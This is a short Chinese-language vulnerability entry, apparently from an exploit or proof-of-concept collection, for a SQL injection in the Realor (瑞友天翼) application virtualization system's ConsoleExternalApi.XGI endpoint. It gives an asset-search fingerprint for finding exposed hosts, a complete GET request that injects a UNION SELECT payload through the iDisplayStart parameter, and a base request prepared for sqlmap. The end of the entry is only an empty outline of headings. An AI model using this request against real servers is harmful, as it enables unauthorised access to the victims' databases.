# 瑞友天翼应用虚拟化系统ConsoleExternalApi.XGISQL注入漏洞

- **系统**：瑞友天翼应用虚拟化系统ConsoleExternalApi.XGI　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="REALOR 瑞友天翼虚拟化平台"`
- **请求**：`GET /ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5,md5(1)%23 HTTP/1.1`

**请求体 / payload**
```

sqlmap
GET /ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1 HTTP/1.1
Host:
```

**其他**
- 瑞友天翼应用虚拟化系统ConsoleExternalApi.XGI SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 瑞友天翼应用虚拟化系统